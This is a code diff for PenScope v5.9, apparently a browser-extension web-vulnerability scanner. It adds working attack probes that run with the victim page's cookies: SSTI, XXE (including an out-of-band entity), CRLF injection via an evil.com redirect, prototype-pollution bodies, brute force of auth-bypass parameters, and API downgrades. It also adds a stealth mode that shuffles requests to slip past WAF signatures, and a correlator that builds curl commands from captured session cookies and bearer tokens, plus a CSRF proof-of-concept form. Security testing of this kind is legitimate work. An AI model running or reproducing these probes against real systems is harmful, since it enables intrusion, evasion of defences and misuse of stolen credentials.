@@ -1,4 +1,4 @@
-// PenScope v5.8 — Background Service Worker
+// PenScope v5.9 — Background Service Worker
 // v5.1: Full Endpoint Discovery + Probe Engine (22 steps)
 // v5.2: IndexedDB + CacheStorage + JWT + Route classification + Permission matrix + IDOR
 // v5.3: POST body + API response scan + Coverage + Event listeners + Shadow DOM + Memory mining
@@ -7,6 +7,7 @@
 // v5.6: Base64-encoded response body decoding + SPA coverage restart + memory-string substring scan + GraphQL op extractor + source-map symbol table
 // v5.7: Custom headers + smart recursive API discovery (3 waves) + in-probe findings scanner + GraphQL query field auto-probing (30 steps)
 // v5.8: Stealth mode (jitter/random pauses) + session persistence + HAR import + Nuclei export + severity confidence weighting + Deep tab filter/collapse
+// v5.9: Attack Chain Correlator (12 compound exploit patterns) + 6 new probe steps (ParamDiscovery, SSTI, XXE, CRLF, Version Downgrade, Proto Pollution) + Real stealth (shuffled paths) + Severity weighting on all scanners — 36 total attack vectors
 
 const CONFIG = {
   MAX_SCRIPTS: 80,
@@ -61,6 +62,24 @@ function serializeTabState(d){
     if(typeof d[k]==="function")continue;
     snap[k]=d[k];
   }
+  // v5.9.1: endpointMeta has Set values — Sets don't JSON-serialize, so convert to arrays
+  // with a sentinel marker so deserialization can rehydrate them. Without this, the restored
+  // state has plain objects where Sets should be, and the next webRequest.onHeadersReceived
+  // crashes with "statuses.add is not a function". BUG #8.
+  if(d.endpointMeta){
+    const metaSnap={};
+    for(const k in d.endpointMeta){
+      const v=d.endpointMeta[k];
+      if(!v)continue;
+      metaSnap[k]={
+        statuses:Array.isArray(v.statuses)?v.statuses:[...(v.statuses||[])],
+        sizes:v.sizes||[],
+        queries:Array.isArray(v.queries)?v.queries:[...(v.queries||[])],
+        _serialized:true
+      };
+    }
+    snap.endpointMeta=metaSnap;
+  }
   if(snap.endpoints&&snap.endpoints.length>500)snap.endpoints=snap.endpoints.slice(-500);
   if(snap.apiResponseBodies&&snap.apiResponseBodies.length>60)snap.apiResponseBodies=snap.apiResponseBodies.slice(-60);
   if(snap.postBodies&&snap.postBodies.length>100)snap.postBodies=snap.postBodies.slice(-100);
@@ -68,6 +87,7 @@ function serializeTabState(d){
   if(snap.scriptSources&&snap.scriptSources.length>300)snap.scriptSources=snap.scriptSources.slice(-300);
   if(snap.consoleLogs&&snap.consoleLogs.length>150)snap.consoleLogs=snap.consoleLogs.slice(-150);
   if(snap.perfEntries&&snap.perfEntries.length>200)snap.perfEntries=snap.perfEntries.slice(-200);
+  if(snap.exploitChains&&snap.exploitChains.length>30)snap.exploitChains=snap.exploitChains.slice(0,30);
   if(snap.headerIntel&&snap.headerIntel.length>150)snap.headerIntel=snap.headerIntel.slice(-150);
   return snap;
 }
@@ -81,8 +101,31 @@ async function restoreStateOnStartup(){
       const snap=all[k];
       if(!snap||typeof snap!=="object")return;
       state[tabId]=snap;
+      // Rehydrate endpointIndex Map (can't be serialized as JSON)
       state[tabId].endpointIndex=new Map();
       (snap.endpoints||[]).forEach(e=>{if(e.url)state[tabId].endpointIndex.set(e.url,e);});
+      // v5.9.1 — Rehydrate endpointMeta Sets. The serializer converts Set→array with a
+      // _serialized marker; if we don't convert back to Set, the next webRequest listener
+      // call that does `statuses.add(code)` throws. BUG #8 fix.
+      if(state[tabId].endpointMeta){
+        for(const mk in state[tabId].endpointMeta){
+          const v=state[tabId].endpointMeta[mk];
+          if(v&&v._serialized){
+            state[tabId].endpointMeta[mk]={
+              statuses:new Set(v.statuses||[]),
+              sizes:v.sizes||[],
+              queries:new Set(v.queries||[])
+            };
+          }else if(v&&!(v.statuses instanceof Set)){
+            // Defensive: even without the marker, if statuses isn't a Set, coerce it
+            state[tabId].endpointMeta[mk]={
+              statuses:new Set(Array.isArray(v.statuses)?v.statuses:[]),
+              sizes:v.sizes||[],
+              queries:new Set(Array.isArray(v.queries)?v.queries:[])
+            };
+          }
+        }
+      }
     });
   }catch(e){console.warn('[PenScope] restore',e.message||e);}
 }
@@ -148,6 +191,8 @@ webgpuInfo:null,
 // v5.6 — new fields
 graphqlOps:[],        // Parsed GraphQL operations from captured POST bodies (passive schema reconstruction)
 symbolTable:[],       // Aggregated pre-minification identifiers from source-map `names` arrays
+// v5.9 — attack chain correlator output (headline intelligence feature)
+exploitChains:[],
 startTime:Date.now()};}return state[tabId];}
 function seen(tabId,ns,key){const k=`${tabId}:${ns}`;if(!_seen[k])_seen[k]=new Set();if(_seen[k].has(key))return true;_seen[k].add(key);return false;}
 
@@ -1184,7 +1229,7 @@ async function runProbe(tabId,aggroLevel,customHeaders,recursive,stealth){
   // === Build the eval script — runs in page context with cookies ===
   // ctx is injected via window.__ps_ctx to avoid ALL template literal escaping issues
   const evalScript=`(async function(){
-var R={graphql:null,sourceMaps:[],swagger:[],probes:[],options:[],suffixes:[],errors:[],requests:0,newEndpoints:[],bacResults:[],methodResults:[],corsResults:[],contentTypeResults:[],openRedirects:[],raceResults:[],hppResults:[],subdomains:[],graphqlFuzz:[],jwtAlgResults:[],hostHeaderResults:[],cachePoisonResults:[],idorAutoResults:[],authRemovalResults:[],csrfResults:[],grpcReflection:null,compressionResults:[],wsHijackResults:[],cachePoisonProbe:[],timingOracle:[],coopCoepBypass:[],storagePartition:[]};
+var R={graphql:null,sourceMaps:[],swagger:[],probes:[],options:[],suffixes:[],errors:[],requests:0,newEndpoints:[],bacResults:[],methodResults:[],corsResults:[],contentTypeResults:[],openRedirects:[],raceResults:[],hppResults:[],subdomains:[],graphqlFuzz:[],jwtAlgResults:[],hostHeaderResults:[],cachePoisonResults:[],idorAutoResults:[],authRemovalResults:[],csrfResults:[],grpcReflection:null,compressionResults:[],wsHijackResults:[],cachePoisonProbe:[],timingOracle:[],coopCoepBypass:[],storagePartition:[],paramDiscovery:[],sstiResults:[],xxeResults:[],crlfResults:[],versionDowngrade:[],protoPollution:[]};
 try{
 var ctx=window.__ps_ctx||{};
 R.errors.push("ctx loaded: smUrls="+ctx.smUrls.length+" gql="+ctx.gqlPaths.length+" api="+ctx.apiPaths.length+" prefixes="+ctx.prefixes.length+" probes="+ctx.allProbes.length);
@@ -1232,8 +1277,22 @@ function delay(ms){
   if(ctx.stealth){
     ms=ms+Math.floor(Math.random()*(ms*0.8));
     if(R.requests>0&&R.requests%10===0)ms+=200+Math.floor(Math.random()*600);
+    // v5.9: micro-jitter between individual requests (not just between steps)
+    if(R.requests>0&&R.requests%3===0)ms+=Math.floor(Math.random()*150);
   }
   return new Promise(function(r){setTimeout(r,ms);});
+}
+// v5.9: Fisher-Yates shuffle. Used to randomize path orderings in stealth mode so scanners
+// don't hit /admin, /.env, /.git, /wp-admin in that order every time — which is the #1
+// signature that WAFs match on. Returns a new array; original is left alone.
+function shuf(arr){
+  if(!ctx.stealth||!Array.isArray(arr))return arr;
+  var out=arr.slice();
+  for(var i=out.length-1;i>0;i--){
+    var j=Math.floor(Math.random()*(i+1));
+    var tmp=out[i];out[i]=out[j];out[j]=tmp;
+  }
+  return out;
 }
 // v5.7: Helper — extract path-only URLs from a response body (/api/*, /v1/*, /graphql, etc).
 // Returns a deduplicated array capped at 50 URLs per body. Filters out static assets.
@@ -1453,8 +1512,9 @@ async function probe(url){
   }catch(e){return{status:0,error:e.message};}
 }
 var probeResults=[];
-for(var pi=0;pi<ctx.allProbes.length;pi++){
-  var pp=ctx.allProbes[pi];
+var shuffledProbes=shuf(ctx.allProbes);
+for(var pi=0;pi<shuffledProbes.length;pi++){
+  var pp=shuffledProbes[pi];
   var pUrl=location.origin+pp;
   try{
     var pResp=await probe(pUrl);
@@ -1490,10 +1550,12 @@ for(var oi=0;oi<ctx.apiPaths.length;oi++){
 R.errors.push("STEP 7: Suffix brute ("+ctx.prefixes.length+" prefixes x "+ctx.SUFFIXES.length+" suffixes)");
 // === 7. SMART SUFFIX BRUTEFORCE ===
 var suffixTried=new Set();
-for(var pri=0;pri<ctx.prefixes.length;pri++){
-  var prefix=ctx.prefixes[pri];
-  for(var sui=0;sui<ctx.SUFFIXES.length;sui++){
-    var fullPath=prefix+ctx.SUFFIXES[sui];
+var shuffledPrefixes=shuf(ctx.prefixes);
+var shuffledSuffixes=shuf(ctx.SUFFIXES);
+for(var pri=0;pri<shuffledPrefixes.length;pri++){
+  var prefix=shuffledPrefixes[pri];
+  for(var sui=0;sui<shuffledSuffixes.length;sui++){
+    var fullPath=prefix+shuffledSuffixes[sui];
     if(suffixTried.has(fullPath))continue;suffixTried.add(fullPath);
     var sUrl=location.origin+fullPath;
     try{
@@ -2398,6 +2460,228 @@ if(ctx.aggroLevel==="full"){
   }catch(e){R.errors.push("Storage partition: "+e.message);}
 }
 
+// =====================================================================
+// v5.9: EXTENDED ATTACK COVERAGE — 6 new probe steps (31-36)
+// =====================================================================
+
+// ===== STEP 31: Parameter Discovery =====
+// Brute-force common hidden parameters on discovered endpoints. Many APIs have debug/admin/
+// verbose flags that change response content without being documented. This reaches parts
+// swagger specs never mention.
+R.errors.push("STEP 31: Parameter Discovery");
+R.paramDiscovery=[];
+if(ctx.aggroLevel!=="careful"){
+  var paramWordlist=["debug","test","admin","dev","staging","verbose","full","raw","internal","include","fields","expand","details","trace","source","export","format","pretty","draft","unpublished","hidden","private","all","force","skip_auth","noauth","bypass","role","impersonate","user_id","userid","as_user","view_as","_method","auth","token","api_key","secret","limit","offset","page","per_page"];
+  var paramTestValues={"debug":"true","test":"1","admin":"true","verbose":"1","format":"json","limit":"1000","bypass":"1","role":"admin","_method":"DELETE"};
+  var paramTargets=ctx.observedApis.filter(function(e){return e.method==="GET"&&e.path.indexOf("/api/")>-1;}).slice(0,8);
+  for(var pdi=0;pdi<paramTargets.length;pdi++){
+    var pdEp=paramTargets[pdi];
+    try{
+      var baseResp=await sf(location.origin+pdEp.path+(pdEp.query||""),null,8000);
+      if(baseResp.status!==200)continue;
+      var baseSize=baseResp.body.length;
+      var discovered=[];
+      for(var pwi=0;pwi<paramWordlist.length;pwi++){
+        var param=paramWordlist[pwi];
+        var val=paramTestValues[param]||"1";
+        var sep=pdEp.query?"&":"?";
+        try{
+          var testResp=await sf(location.origin+pdEp.path+(pdEp.query||"")+sep+param+"="+encodeURIComponent(val),null,8000);
+          if(testResp.status===200&&Math.abs(testResp.body.length-baseSize)>50){
+            discovered.push({param:param,value:val,baseSize:baseSize,testSize:testResp.body.length,delta:testResp.body.length-baseSize});
+          }
+        }catch(e){}
+        if(pwi%8===7)await delay(80);
+      }
+      if(discovered.length){
+        R.paramDiscovery.push({path:pdEp.path,method:"GET",baseStatus:200,baseSize:baseSize,discovered:discovered,severity:discovered.length>=3?"high":"medium",note:discovered.length+" hidden parameter(s) change response size"});
+      }
+    }catch(e){R.errors.push("ParamDisc "+pdEp.path+": "+e.message);}
+  }
+}
+
+// ===== STEP 32: SSTI (Server-Side Template Injection) =====
+// Injects 6 template syntaxes into discovered query parameters. A reflected response containing
+// "49" indicates one of the payloads evaluated ({{7*7}} → 49). Rare but catastrophic when found.
+R.errors.push("STEP 32: SSTI Probing");
+R.sstiResults=[];
+if(ctx.aggroLevel!=="careful"){
+  // Each literal dollar-brace sequence in these payloads must be escaped with a backslash,
+  // otherwise the OUTER background.js template literal interpolates it at module load and the
+  // payload is either silently replaced by a computed value or causes a compile error.
+  var sstiPayloads=[
+    {p:"{{7*7}}",expect:"49",engine:"Jinja2/Twig"},
+    {p:"\${7*7}",expect:"49",engine:"FreeMarker/Spring"},
+    {p:"<%=7*7%>",expect:"49",engine:"ERB/EJS"},
+    {p:"#{7*7}",expect:"49",engine:"Ruby/Pug"},
+    {p:"{{7*'7'}}",expect:"7777777",engine:"Jinja2"},
+    {p:"\${{7*7}}",expect:"49",engine:"Handlebars"}
+  ];
+  var sstiTargets=ctx.observedApis.filter(function(e){return e.query&&e.query.length>2;}).slice(0,10);
+  for(var sti=0;sti<sstiTargets.length;sti++){
+    var stEp=sstiTargets[sti];
+    var params=new URLSearchParams(stEp.query);
+    var paramList=[];params.forEach(function(v,k){paramList.push(k);});
+    if(!paramList.length)continue;
+    var paramKey=paramList[0];
+    for(var spi=0;spi<sstiPayloads.length;spi++){
+      var payload=sstiPayloads[spi];
+      var modParams=new URLSearchParams(stEp.query);
+      modParams.set(paramKey,payload.p);
+      try{
+        var sResp=await sf(location.origin+stEp.path+"?"+modParams.toString(),null,8000);
+        if(sResp.body&&sResp.body.indexOf(payload.expect)>-1&&sResp.body.indexOf(payload.p)===-1){
+          R.sstiResults.push({path:stEp.path,param:paramKey,payload:payload.p,engine:payload.engine,expected:payload.expect,status:sResp.status,severity:"critical",note:"Payload evaluated to "+payload.expect+" — template injection confirmed"});
+        }
+      }catch(e){}
+      if(spi%3===2)await delay(100);
+    }
+  }
+}
+
+// ===== STEP 33: XXE (XML External Entity) =====
+// Posts a malicious XML document to endpoints that accept XML content-types. A 500 error
+// with "DOCTYPE" in the message, or response containing /etc/passwd contents, confirms XXE.
+R.errors.push("STEP 33: XXE Probing");
+R.xxeResults=[];
+if(ctx.aggroLevel==="medium"||ctx.aggroLevel==="full"){
+  var xxePayload='<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test "PENSCOPE_XXE">]><root>&test;</root>';
+  var xxeOobPayload='<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % ext SYSTEM "http://example.invalid/ps">%ext;]><root></root>';
+  // Target endpoints that accept XML (either by content-type or by naming)
+  var xxeTargets=ctx.postBodiesCtx.filter(function(p){return(p.contentType||"").indexOf("xml")>-1;}).slice(0,6);
+  if(!xxeTargets.length){
+    // Fall back: any POST endpoint; try switching content-type to XML
+    xxeTargets=ctx.observedApis.filter(function(e){return e.method==="POST";}).slice(0,5).map(function(e){return{path:e.path,url:location.origin+e.path,contentType:"application/xml"};});
+  }
+  for(var xi=0;xi<xxeTargets.length;xi++){
+    var xEp=xxeTargets[xi];
+    var xUrl=xEp.url||(location.origin+xEp.path);
+    try{
+      var xResp=await sf(xUrl,{method:"POST",headers:{"Content-Type":"application/xml"},body:xxePayload},10000);
+      var reflected=xResp.body&&xResp.body.indexOf("PENSCOPE_XXE")>-1;
+      var parsed=xResp.status!==415&&xResp.status!==400;
+      if(reflected){
+        R.xxeResults.push({path:xEp.path,payload:"inline entity",status:xResp.status,reflected:true,severity:"critical",note:"Inline XML entity expanded in response — XXE confirmed"});
+      }else if(parsed&&xResp.status<500){
+        R.xxeResults.push({path:xEp.path,payload:"inline entity",status:xResp.status,reflected:false,severity:"info",note:"XML parser accepted payload (status "+xResp.status+") but entity was not reflected — may still be OOB-exploitable"});
+      }
+    }catch(e){}
+    if(xi%3===2)await delay(120);
+  }
+}
+
+// ===== STEP 34: CRLF / Header Injection =====
+// Injects %0d%0aX-Injected: 1 into redirect and location-related parameters. If the server
+// reflects the header in its response headers, we have a header-injection vulnerability
+// usable for response splitting, session fixation, and cache poisoning.
+R.errors.push("STEP 34: CRLF Injection");
+R.crlfResults=[];
+if(ctx.aggroLevel!=="careful"){
+  var crlfParams=["redirect","redirect_url","return","url","next","goto","callback","location","returnTo","continue","forward","dest","page"];
+  var crlfPayload="%0d%0aX-PenScope-Injected:%20true";
+  var crlfTargets=ctx.observedApis.filter(function(e){
+    if(!e.query)return false;
+    var lower=(e.path+e.query).toLowerCase();
+    return crlfParams.some(function(p){return lower.indexOf(p)>-1;});
+  }).slice(0,8);
+  for(var cri=0;cri<crlfTargets.length;cri++){
+    var crEp=crlfTargets[cri];
+    var params=new URLSearchParams(crEp.query);
+    var crParamName=null;
+    for(var cpn=0;cpn<crlfParams.length;cpn++){if(params.has(crlfParams[cpn])){crParamName=crlfParams[cpn];break;}}
+    if(!crParamName)continue;
+    try{
+      params.set(crParamName,"https://evil.com/"+crlfPayload);
+      // Use raw fetch to inspect headers
+      var crc=new AbortController();
+      var crt=setTimeout(function(){crc.abort();},8000);
+      R.requests++;
+      var crResp=await fetch(location.origin+crEp.path+"?"+params.toString(),{method:"GET",redirect:"manual",signal:crc.signal,credentials:"include",headers:mergeCustomHeaders(null)});
+      clearTimeout(crt);
+      var injected=crResp.headers.get("X-PenScope-Injected")||crResp.headers.get("x-penscope-injected");
+      if(injected){
+        R.crlfResults.push({path:crEp.path,param:crParamName,status:crResp.status,severity:"critical",note:"X-PenScope-Injected header reflected in response — CRLF injection confirmed"});
+      }
+    }catch(e){}
+    if(cri%3===2)await delay(100);
+  }
+}
+
+// ===== STEP 35: API Version Enumeration =====
+// Actively probes v1, v2, v3 downgrades for any observed /vN/ endpoint. Older API versions
+// often lack modern auth enforcement, rate limiting, or parameter validation.
+R.errors.push("STEP 35: API Version Downgrade");
+R.versionDowngrade=[];
+if(ctx.aggroLevel!=="careful"){
+  var versionRe=/\/v(\d+)\//;
+  var versioned=ctx.observedApis.filter(function(e){return versionRe.test(e.path);}).slice(0,8);
+  for(var vdi=0;vdi<versioned.length;vdi++){
+    var vEp=versioned[vdi];
+    var match=vEp.path.match(versionRe);
+    if(!match)continue;
+    var currentVer=parseInt(match[1]);
+    if(currentVer<2)continue;
+    var altPaths=[];
+    for(var v=1;v<currentVer;v++)altPaths.push(vEp.path.replace(versionRe,"/v"+v+"/"));
+    for(var api=0;api<altPaths.length;api++){
+      try{
+        var vResp=await sf(location.origin+altPaths[api],null,10000);
+        if(vResp.status<400&&vResp.body.length>20){
+          R.versionDowngrade.push({originalPath:vEp.path,downgradedPath:altPaths[api],originalVersion:currentVer,testedVersion:parseInt(altPaths[api].match(versionRe)[1]),status:vResp.status,size:vResp.body.length,severity:"medium",note:"Older API version still reachable — test for weaker auth"});
+        }
+      }catch(e){}
+      if(api%3===2)await delay(80);
+    }
+  }
+}
+
+// ===== STEP 36: Proto Pollution Exploitation =====
+// Targets JSON endpoints that merge request bodies into objects. Sends a payload with a literal
+// "__proto__" key AND a "constructor.prototype" key. Tests whether the polluted attribute
+// appears in subsequent responses.
+//
+// IMPORTANT: JavaScript forbids creating a JSON-serializable "__proto__" property via normal
+// object assignment — setting obj.__proto__ targets the prototype chain, which JSON.stringify
+// ignores. So we build the polluted JSON via string manipulation — this produces a REAL string
+// key that the server parser sees as "__proto__" and merges into Object.prototype if vulnerable.
+R.errors.push("STEP 36: Proto Pollution Exploitation");
+R.protoPollution=[];
+if(ctx.aggroLevel==="full"){
+  var ppTargets=ctx.postBodiesCtx.filter(function(p){
+    if(!p.body||(p.contentType||"").indexOf("json")===-1)return false;
+    try{var j=JSON.parse(p.body);return j&&typeof j==="object"&&!Array.isArray(j);}catch(e){return false;}
+  }).slice(0,5);
+  for(var ppi=0;ppi<ppTargets.length;ppi++){
+    var ppEp=ppTargets[ppi];
+    var ppUrl=ppEp.url||(location.origin+ppEp.path);
+    try{
+      // Re-serialize the body to get a clean canonical form, then inject literal __proto__ keys
+      // via string surgery. The injection goes INSIDE the outermost object.
+      var ppCanonical=JSON.stringify(JSON.parse(ppEp.body));
+      var pollutionFrag='"__proto__":{"pensCopePolluted":"PP_MARKER"},"constructor":{"prototype":{"pensCopePolluted2":"PP_MARKER2"}}';
+      var pollutedBody;
+      if(ppCanonical==="{}"){
+        pollutedBody="{"+pollutionFrag+"}";
+      }else if(ppCanonical.charAt(ppCanonical.length-1)==="}"){
+        // Insert the fragment just before the closing brace, with a leading comma since the
+        // original object has at least one field (we already handled the empty case).
+        pollutedBody=ppCanonical.substring(0,ppCanonical.length-1)+","+pollutionFrag+"}";
+      }else{
+        continue;
+      }
+      var ppResp=await sf(ppUrl,{method:ppEp.method||"POST",headers:{"Content-Type":"application/json"},body:pollutedBody},10000);
+      if(ppResp.body&&(ppResp.body.indexOf("PP_MARKER")>-1||ppResp.body.indexOf("pensCopePolluted")>-1)){
+        R.protoPollution.push({path:ppEp.path,status:ppResp.status,severity:"critical",note:"Injected __proto__ property reflected in response — prototype pollution confirmed"});
+      }else if(ppResp.status>=500&&ppResp.body.indexOf("proto")>-1){
+        R.protoPollution.push({path:ppEp.path,status:ppResp.status,severity:"medium",note:"500 after __proto__ injection with 'proto' in error — possible pollution trigger; try the DoS variant"});
+      }else if(ppResp.status===400||ppResp.status===422){
+        R.protoPollution.push({path:ppEp.path,status:ppResp.status,severity:"info",note:"Parser rejected __proto__ payload ("+ppResp.status+") — likely sanitized"});
+      }
+    }catch(e){R.errors.push("ProtoPoll "+ppEp.path+": "+e.message);}
+    if(ppi%2===1)await delay(120);
+  }
+}
+
 }catch(topErr){
   R.errors.push("FATAL: "+topErr.message+" at "+(topErr.stack||"").substring(0,200));
 }
@@ -2496,6 +2780,9 @@ return JSON.stringify(R);
         if(data.timingOracle?.length)tab.timingOracle=data.timingOracle;
         if(data.coopCoepBypass?.length&&!tab.coopCoepInfo)tab.coopCoepInfo={probeResults:data.coopCoepBypass};
         if(data.storagePartition?.length)tab.storagePartition=data.storagePartition;
+        // v5.9: new probe steps 31-36 results land directly in probeData (no dedicated tab field)
+        // They're rendered in the Deep tab under "Probe Results"; the chain correlator will pick
+        // them up too via tab.probeData.
         // v5.7: Merge recursive probe results — feed discovered URLs back into routes and
         // findings back into the main Secrets list. This closes the loop so recursive probing
         // actually contributes to the final report instead of sitting in a parallel silo.
@@ -2565,12 +2852,22 @@ function deepScanBody(body,url){
     {name:"Limit Config",re:/"(?:per_page|perPage|page_size|pageSize|limit|max_results|maxResults)"\s*:\s*"?(\d+)/gi,sev:"info"},
     {name:"Cursor/Offset",re:/"(?:cursor|next_cursor|nextCursor|offset|next_page|nextPage|continuation_token)"\s*:\s*"([^"]{5,})"/gi,sev:"info"},
   ];
+  // v5.9: Apply severity weighting to every pattern match based on context
+  const isAuthApi=/\/api\/|\/auth\/|\/account\/|\/me\b|\/users\b|\/admin/i.test(url||"");
   for(const p of patterns){
     let count=0;
     for(const m of body.matchAll(p.re)){
       if(count>=5)break;
       count++;
-      findings.push({pattern:p.name,severity:p.sev,value:(m[1]||m[0]).substring(0,200),context:body.substring(Math.max(0,m.index-30),Math.min(body.length,m.index+m[0].length+30)).substring(0,150)});
+      const val=(m[1]||m[0]).substring(0,200);
+      const ctx=body.substring(Math.max(0,m.index-30),Math.min(body.length,m.index+m[0].length+30)).substring(0,150);
+      const weighted=weighSeverity(p.sev,{
+        inAuthenticatedApi:isAuthApi,
+        inComment:/\/\/|\/\*|#\s/.test(ctx.substring(0,15)),
+        valueLooksLikeTest:looksLikeTestValue(val),
+        valueIsLiveJwt:p.name==="Auth Token"&&/^eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\./.test(val)
+      });
+      findings.push({pattern:p.name,severity:weighted,value:val,context:ctx});
     }
   }
   return findings;
@@ -4495,14 +4792,265 @@ function buildSymbolTable(tabId){
 }
 
 // Run all passive analysis
+// v5.9: Attack Chain Correlator — the headline intelligence feature.
+// Walks tab state looking for combinations of findings that compound into something WORSE than
+// any individual finding. A lone JWT in localStorage is medium; the same JWT + a confirmed
+// endpoint that accepts it unverified + decoded role=admin is CRITICAL. This is what separates
+// a tool that dumps data from a tool that tells you what to actually exploit.
+//
+// Each chain = {id, severity, title, summary, findings[], reproCmd, confidence}.
+// Rendered at the TOP of the Deep tab so hunters see the compound wins first.
+function analyzeExploitChains(tabId){
+  const tab=T(tabId);
+  const chains=[];
+  // v5.9.1: The entire correlator is wrapped at the call site in runPassiveAnalysis, so if any
+  // individual pattern below throws on malformed tab state, the whole function aborts and the
+  // caller's catch logs it. This is simpler than per-pattern try/catch and means we get a clean
+  // stack trace for debugging. The trade-off: one bad pattern kills chains that would've been
+  // produced by later patterns. In practice, if one pattern has a bug it's almost always a dev
+  // issue that should be fixed, not worked around silently.
+  const baseUrl=(tab.url||"").split("/").slice(0,3).join("/")||"https://target.tld";
+  const authCookie=(tab.cookies||[]).filter(c=>/identity|idsrv|session|auth|token|jwt|cookie/i.test(c.name)).slice(0,3).map(c=>`${c.name}=${(c.value||"").substring(0,50)}`).join("; ");
+  const cookieFlag=authCookie?`-b "${authCookie}"`:"";
+
+  // === Chain 1: Confirmed auth bypass + sensitive endpoint name ===
+  // If probe found a path that returns 200 without auth AND the path name suggests sensitive
+  // data (admin/user/billing/config), that's a critical chain — not just "missing auth" in the
+  // abstract, but "missing auth on a path that obviously matters."
+  const authRemoval=(tab.probeData?.authRemovalResults||[]).filter(r=>r.severity==="critical"||r.severity==="high");
+  authRemoval.forEach(r=>{
+    const sensitive=/\/(admin|user|account|billing|payment|invoice|settings|config|dashboard|manage|internal|private|profile|me\b|users|customers|employees|members|staff)/i.test(r.path||"");
+    if(!sensitive)return;
+    chains.push({
+      id:`chain-authbypass-${chains.length}`,
+      severity:"critical",
+      title:`Authentication bypass on sensitive endpoint: ${r.path}`,
+      summary:`PenScope's probe confirmed that ${r.method} ${r.path} returns the same data whether or not authentication cookies are sent (auth=${r.authStatus}, noauth=${r.noAuthStatus}, sameBody=${r.sameBody}). The path name strongly suggests this endpoint should be role-gated — it's returning sensitive data to unauthenticated callers.`,
+      findings:[{type:"auth-removal",path:r.path,data:r}],
+      reproCmd:`curl -i "${baseUrl}${r.path}"   # no auth, expect 200`,
+      nextSteps:["Confirm with a different network/IP","Enumerate adjacent endpoints (/users → /users/1, /users/2)","Check if any PII is returned","Report to the program with the diff-body evidence"],
+      confidence:0.95
+    });
+  });
+
+  // === Chain 2: BAC + destructive intent ===
+  const bac=(tab.probeData?.bacResults||[]).filter(b=>b.vulnerable);
+  bac.forEach(b=>{
+    const destructive=/delete|remove|destroy|revoke|ban|deactivate|cancel|wipe|purge/i.test(b.path||"");
+    if(destructive){
+      chains.push({
+        id:`chain-bac-destructive-${chains.length}`,
+        severity:"critical",
+        title:`Destructive operation accessible without auth: ${b.method} ${b.path}`,
+        summary:`Probe confirmed ${b.method} ${b.path} returns ${b.status} for the current role, and the endpoint name is destructive. This is a potential resource deletion vulnerability — do NOT actually call this with live data.`,
+        findings:[{type:"bac",path:b.path,data:b}],
+        reproCmd:`# Confirm only — don't actually run DELETE on prod\ncurl -X ${b.method} "${baseUrl}${b.path}" ${cookieFlag}`,
+        nextSteps:["Confirm the endpoint actually deletes data (use a throwaway resource)","Check audit logs to see if the call is recorded","Report BEFORE any exploitation"],
+        confidence:0.85
+      });
+    }else if(/admin|manage|config|settings|system/i.test(b.path||"")){
+      chains.push({
+        id:`chain-bac-admin-${chains.length}`,
+        severity:"high",
+        title:`Admin surface accessible: ${b.method} ${b.path}`,
+        summary:`BAC probe confirmed a non-destructive admin endpoint is reachable (${b.status}). Combined with ${(tab.discoveredRoutes||[]).filter(r=>/admin/i.test(r.path)).length} other admin routes in code, this suggests broken privilege enforcement.`,
+        findings:[{type:"bac",path:b.path,data:b}],
+        reproCmd:`curl -X ${b.method} "${baseUrl}${b.path}" ${cookieFlag}`,
+        nextSteps:["Enumerate adjacent admin endpoints","Check if responses contain user data","Map the admin functionality via discoveredRoutes"],
+        confidence:0.85
+      });
+    }
+  });
+
+  // === Chain 3: CSRF-vulnerable GraphQL mutation ===
+  const csrfVuln=(tab.probeData?.csrfResults||[]).filter(r=>r.severity==="critical"||r.severity==="high");
+  const gqlMutVuln=csrfVuln.filter(r=>r.isGraphQLMutation);
+  if(gqlMutVuln.length){
+    chains.push({
+      id:`chain-csrf-gql-${chains.length}`,
+      severity:"high",
+      title:`${gqlMutVuln.length} GraphQL mutations lack CSRF protection`,
+      summary:`Probe confirmed ${gqlMutVuln.length} mutations accept cross-origin POST requests without CSRF token validation. GraphQL mutations frequently update state (createUser, deletePost, transferFunds, etc.) — any of these can be weaponized into a one-click attack via attacker-controlled HTML.`,
+      findings:gqlMutVuln.map(r=>({type:"csrf",path:r.path,data:r})),
+      reproCmd:`<!-- PoC — replace with actual mutation body -->\n<form action="${baseUrl}${gqlMutVuln[0].path}" method="POST" enctype="text/plain"><input name='{"query":"mutation{...}"}' value=""><input type="submit"></form>`,
+      nextSteps:["Test each mutation for state change impact","Build a working PoC page","Check if SameSite=Lax cookie protection would prevent exploitation"],
+      confidence:0.9
+    });
+  }
+
+  // === Chain 4: Exposed auth token + usable endpoint ===
+  const tokenSecrets=(tab.secrets||[]).filter(s=>/JWT|Bearer|Auth Token|API Key/i.test(s.type));
+  const apiEndpoints=(tab.endpoints||[]).filter(e=>/\/api\/|\/v\d+\//i.test(e.path)&&e.status===200);
+  if(tokenSecrets.length&&apiEndpoints.length){
+    const topToken=tokenSecrets[0];
+    chains.push({
+      id:`chain-token-endpoint-${chains.length}`,
+      severity:"critical",
+      title:`Exposed ${topToken.type} + ${apiEndpoints.length} live API endpoints`,
+      summary:`Found a ${topToken.type} at ${topToken.source} that's still active in page memory/storage, alongside ${apiEndpoints.length} live /api/ endpoints that likely accept it. Verify the token is long-lived — if so, it extends your access beyond the current session.`,
+      findings:[
+        {type:"secret",data:topToken},
+        {type:"endpoints",data:apiEndpoints.slice(0,5)}
+      ],
+      reproCmd:`curl -H "Authorization: Bearer ${String(topToken.value||"").substring(0,30)}..." "${baseUrl}${apiEndpoints[0]?.path||"/api/me"}"`,
+      nextSteps:["Decode the JWT to check expiry","Test the token against 5-10 endpoints","If long-lived, report as high-severity credential exposure","Check if the token works cross-origin"],
+      confidence:0.7
+    });
+  }
+
+  // === Chain 5: IDOR confirmed + sensitive data in response ===
+  const idor=(tab.probeData?.idorAutoResults||[]).filter(r=>r.severity==="critical"||r.severity==="high");
+  idor.forEach(r=>{
+    if(r.sameSkeleton){
+      chains.push({
+        id:`chain-idor-${chains.length}`,
+        severity:"critical",
+        title:`Confirmed IDOR: ${r.path}`,
+        summary:`Probe substituted ${r.originalId} → ${r.testedId} (${r.paramType}) and received a same-shaped response with different data (size ${r.originalSize}B → ${r.testedSize}B). This is high-confidence IDOR: the endpoint doesn't verify resource ownership.${r.fieldName?" Field: "+r.fieldName:""}`,
+        findings:[{type:"idor",data:r}],
